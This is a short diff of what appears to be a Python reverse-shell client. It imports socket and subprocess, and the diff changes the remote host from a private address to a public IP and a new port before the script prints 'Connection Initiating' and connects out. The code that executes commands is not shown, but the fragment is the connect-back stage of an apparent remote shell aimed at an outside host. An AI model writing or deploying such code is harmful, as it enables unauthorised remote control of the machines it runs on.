@@ -1,8 +1,8 @@
 import socket
 import subprocess
 
-REMOTE_HOST = '10.20.18.185' # '192.168.43.82'
-REMOTE_PORT = 2222 # 2222
+REMOTE_HOST = '80.146.99.7' # '192.168.43.82'
+REMOTE_PORT = 1518 # 2222
 client = socket.socket()
 print("[-] Connection Initiating...")
 client.connect((REMOTE_HOST, REMOTE_PORT))
